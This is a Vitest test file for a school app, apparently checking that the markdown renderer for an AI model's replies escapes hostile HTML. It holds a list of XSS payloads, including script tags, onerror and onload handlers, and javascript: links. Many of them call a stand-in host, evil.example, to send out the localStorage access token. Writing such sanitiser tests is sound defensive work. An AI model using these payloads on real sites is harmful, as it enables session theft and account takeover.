import { describe, it, expect } from "vitest";
import { escapeHtml, renderMarkdown } from "./copilot-markdown";

/**
 * renderMarkdown output goes straight into dangerouslySetInnerHTML.
 *
 * Its input is the assistant's reply, and the assistant's context is built from
 * school data that users control — student names, message bodies, notice text.
 * So the input has to be treated as hostile: a parent who names their child
 * `<img src=x onerror=...>` must not get script execution in the browser of
 * every staff member who asks the assistant about that pupil. The JWT lives in
 * localStorage, so that would be a full account takeover.
 */

const STEAL = "fetch('//evil.example/'+localStorage.access_token)";

/**
 * Ask the browser what the markup actually *is*, rather than grepping the
 * string. An escaped payload legitimately contains the text "onerror=", so a
 * substring check would flag inert output; what matters is whether the DOM ends
 * up with an executable element or an event-handler attribute.
 */
function inspect(html: string) {
  const doc = new DOMParser().parseFromString(html, "text/html");
  const els = Array.from(doc.body.querySelectorAll("*"));
  return {
    tags: els.map((e) => e.tagName.toLowerCase()),
    eventAttrs: els.flatMap((e) =>
      Array.from(e.attributes)
        .map((a) => a.name.toLowerCase())
        .filter((n) => n.startsWith("on")),
    ),
    urlAttrs: els.flatMap((e) =>
      ["href", "src", "action"]
        .map((a) => e.getAttribute(a))
        .filter((v): v is string => v !== null),
    ),
  };
}

/** Elements that can run script, load remote content, or restyle the page. */
const DANGEROUS_TAGS = [
  "script", "img", "iframe", "svg", "style", "form", "a", "object",
  "embed", "link", "base", "video", "audio", "input", "body", "meta",
];

describe("escapeHtml", () => {
  it("escapes every markup-significant character", () => {
    expect(escapeHtml(`<>&"'`)).toBe("&lt;&gt;&amp;&quot;&#39;");
  });

  it("escapes the ampersand first so entities are not double-decoded", () => {
    // If & were escaped last, "&lt;" typed by a user would become a real "<".
    expect(escapeHtml("&lt;script&gt;")).toBe("&amp;lt;script&amp;gt;");
  });

  it("leaves ordinary text alone", () => {
    expect(escapeHtml("Ayesha Khan - Grade 7")).toBe("Ayesha Khan - Grade 7");
  });
});

describe("renderMarkdown — injection", () => {
  const payloads: Array<[string, string]> = [
    ["script tag", `<script>${STEAL}</script>`],
    ["img onerror", `<img src=x onerror="${STEAL}">`],
    ["svg onload", `<svg onload="${STEAL}">`],
    ["iframe javascript:", `<iframe src="javascript:${STEAL}"></iframe>`],
    ["body onload", `<body onload="${STEAL}">`],
    ["details ontoggle", `<details open ontoggle="${STEAL}">`],
    ["anchor javascript href", `<a href="javascript:${STEAL}">click</a>`],
    ["style exfiltration", `<style>@import url('//evil.example/x');</style>`],
    ["form action", `<form action="//evil.example"><input name=x>`],
    ["unclosed tag", `<img src=x onerror=${STEAL}`],
    ["mixed case", `<ImG SrC=x OnErRoR="${STEAL}">`],
    ["nested in bold", `**<img src=x onerror="${STEAL}">**`],
    ["inside think block", `<think><img src=x onerror="${STEAL}"></think>`],
    ["inside streaming think", `<think><img src=x onerror="${STEAL}">`],
  ];

  it.each(payloads)("neutralises %s", (_label, payload) => {
    const { tags, eventAttrs, urlAttrs } = inspect(renderMarkdown(payload));

    for (const tag of DANGEROUS_TAGS) {
      expect(tags, `rendered a <${tag}> element`).not.toContain(tag);
    }
    expect(eventAttrs, "rendered an inline event handler").toEqual([]);
    for (const url of urlAttrs) {
      expect(url.toLowerCase()).not.toContain("javascript:");
    }
  });

  it("keeps a hostile student name inert in a normal sentence", () => {
    const reply = `The student <img src=x onerror="${STEAL}"> is in Grade 7.`;
    const html = renderMarkdown(reply);

    // The payload survives as visible text, not as markup.
    expect(html).toContain("&lt;img");
    const { tags } = inspect(html);
    expect(tags).not.toContain("img");
    expect(new DOMParser().parseFromString(html, "text/html").body.textContent)
      .toContain("<img src=x");
  });

  it("does not let an attacker close a tag the renderer opened", () => {
    // Trying to break out of the <details> wrapper the think-block builds.
    const html = renderMarkdown(`<think></div></details><img src=x onerror=1></think>`);
    const { tags, eventAttrs } = inspect(html);
    expect(tags).not.toContain("img");
    expect(eventAttrs).toEqual([]);
    expect(tags.filter((t) => t === "details")).toHaveLength(1);
  });
});

describe("renderMarkdown — formatting still works", () => {
  it("renders bold, italic and code", () => {
    expect(renderMarkdown("**bold**")).toContain("<strong>bold</strong>");
    expect(renderMarkdown("*italic*")).toContain("<em>italic</em>");
    expect(renderMarkdown("`code`")).toContain("<code");
  });

  it("renders headings and lists", () => {
    expect(renderMarkdown("# Title")).toContain("<p class=");
    expect(renderMarkdown("- item")).toContain("<li");
    expect(renderMarkdown("1. item")).toContain("<li");
  });

  it("converts newlines to breaks", () => {
    expect(renderMarkdown("a\nb")).toContain("<br/>");
  });

  it("renders a completed think block as a collapsible section", () => {
    const html = renderMarkdown("<think>reasoning here</think>answer");
    expect(html).toContain("<details");
    expect(html).toContain("reasoning here");
    expect(html).toContain("answer");
  });

  it("renders an unclosed think block while streaming", () => {
    const html = renderMarkdown("<think>still going");
    expect(html).toContain("<details open");
    expect(html).toContain("still going");
  });

  it("strips internal protocol tags", () => {
    expect(renderMarkdown("before<altrix_action>X</altrix_action>after"))
      .not.toContain("altrix_action");
  });

  it("handles empty and non-string input", () => {
    expect(renderMarkdown("")).toBe("");
    expect(renderMarkdown(null as unknown as string)).toBe("");
  });
});
